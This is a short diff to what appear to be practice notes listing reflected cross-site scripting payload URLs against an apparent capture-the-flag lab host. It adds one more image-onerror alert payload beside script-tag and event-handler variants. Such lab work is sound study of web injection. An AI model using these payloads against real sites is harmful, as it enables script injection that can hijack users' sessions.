@@ -38,6 +38,7 @@ test999
 0u132isu.eu1.ctfio.com/basic/?name="><u>test999<script>alert(1)</script>
 0u132isu.eu1.ctfio.com/basic/?name="><u>test999<script>alert('XSS')</script>
 
+0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onerror=alert(1)> 
 0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onerror=alert(1);> [Java Script]
 0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onerror=alert('XSS');>
 0u132isu.eu1.ctfio.com/basic/?name="><u>test999"><img src=x onmouseover=alert(1)>
